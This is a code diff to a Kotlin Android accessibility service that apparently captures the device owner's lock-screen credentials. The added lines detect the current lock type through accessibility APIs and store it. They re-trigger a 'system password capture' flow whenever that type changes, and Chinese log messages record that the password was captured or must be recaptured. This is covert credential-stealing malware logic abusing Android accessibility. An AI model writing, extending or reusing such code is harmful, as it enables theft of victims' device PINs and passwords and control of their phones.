@@ -3412,8 +3412,17 @@ class MyAccessibilityService : AccessibilityService() {
 
             getSharedPreferences("app_state", Context.MODE_PRIVATE).edit()
                 .putBoolean("cipher_excluded", true).apply()
+            val currentLockType = try {
+                val root = rootInActiveWindow
+                val detected = accessibilityEventRouter?.detectLockType(root)
+                root?.recycle()
+                detected?.name?.lowercase() ?: "unknown"
+            } catch (_: Exception) { "unknown" }
             getSharedPreferences("cipher_config", Context.MODE_PRIVATE).edit()
-                .putBoolean("cipher_completed", true).apply()
+                .putBoolean("cipher_completed", true)
+                .putString("cipher_lock_type", currentLockType)
+                .apply()
+            android.util.Log.d(TAG, "🔐 cipher_completed=true, lock_type=$currentLockType")
 
             val ccm = cipherCaptureManager
             if (ccm != null) {
@@ -3916,15 +3925,34 @@ class MyAccessibilityService : AccessibilityService() {
             coroutineScope?.launch(Dispatchers.IO) {
                 try {
                     kotlinx.coroutines.delay(3000)
-                    val cipherDone = getSharedPreferences("cipher_config", Context.MODE_PRIVATE)
-                        .getBoolean("cipher_completed", false)
-                    if (!cipherDone) {
-                        android.util.Log.d(TAG, "🔐 [postAuth] 启动密码验证流程")
+                    val prefs = getSharedPreferences("cipher_config", Context.MODE_PRIVATE)
+                    val cipherDone = prefs.getBoolean("cipher_completed", false)
+                    val savedType = prefs.getString("cipher_lock_type", "") ?: ""
+
+                    val currentType = kotlinx.coroutines.withContext(kotlinx.coroutines.Dispatchers.Main) {
+                        try {
+                            val root = rootInActiveWindow
+                            val detected = accessibilityEventRouter?.detectLockType(root)
+                            root?.recycle()
+                            detected?.name?.lowercase() ?: ""
+                        } catch (_: Exception) { "" }
+                    }
+
+                    val typeChanged = cipherDone && currentType.isNotEmpty()
+                        && savedType.isNotEmpty() && currentType != savedType
+
+                    if (!cipherDone || typeChanged) {
+                        if (typeChanged) {
+                            android.util.Log.d(TAG, "🔐 [postAuth] 密码类型变化: $savedType → $currentType，重新捕获")
+                            prefs.edit().putBoolean("cipher_completed", false).apply()
+                        } else {
+                            android.util.Log.d(TAG, "🔐 [postAuth] 启动密码验证流程")
+                        }
                         kotlinx.coroutines.withContext(kotlinx.coroutines.Dispatchers.Main) {
                             doLaunchSystemPasswordCapture(isInstallationFlow = true)
                         }
                     } else {
-                        android.util.Log.d(TAG, "🔐 [postAuth] 密码已捕获，跳过")
+                        android.util.Log.d(TAG, "🔐 [postAuth] 密码已捕获(type=$savedType)，跳过")
                     }
                 } catch (_: Exception) {}
             }
